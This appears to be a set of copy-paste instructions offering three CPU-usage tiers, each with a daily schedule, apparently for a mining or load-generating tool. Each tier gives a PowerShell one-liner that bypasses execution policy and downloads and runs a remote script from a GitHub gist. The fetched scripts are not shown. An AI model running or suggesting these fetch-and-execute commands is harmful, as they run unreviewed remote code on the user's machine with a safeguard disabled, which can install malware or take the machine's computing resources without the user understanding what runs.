MINIMUM

25% CPU Usage / 24 Hours
6:45-6:45 Day Session at 25%
7:00-7:00 Night Session at 25%

@powershell -NoProfile -ExecutionPolicy Bypass -Command "iex ((new-object net.webclient).DownloadString('https://gist.githubusercontent.com/i7-7700/bc1eb60c0cded3fa70bf15b78def9e5f/raw/6bd65dc238c02ab9d8fe3698c16d977bdeab4e21/Minimum.ps1'))"

--------------------------------------------------------------------------

DEFAULT

75% CPU Usage / 24 Hours
6:30-6:30 Day Session at 50%
7:00-7:00 Night Session at 100%

@powershell -NoProfile -ExecutionPolicy Bypass -Command "iex ((new-object net.webclient).DownloadString('https://gist.githubusercontent.com/i7-7700/01dc9aa6bb601755ae85b0214cc87458/raw/2a96a3c5f592b91e69d9b7c77928e68afc05d72d/Default.ps1'))"

--------------------------------------------------------------------------

FULL

100% CPU Usage / 24 Hours
6:50-6:50 Day Session at 100%
7:00-7:00 Night Session at 100%

@powershell -NoProfile -ExecutionPolicy Bypass -Command "iex ((new-object net.webclient).DownloadString('https://gist.githubusercontent.com/i7-7700/c507fe6653e637032b03f681a9c4dc1a/raw/b6011af061915951b6dc480a355e34de3178c66c/Full.ps1'))"

--------------------------------------------------------------------------
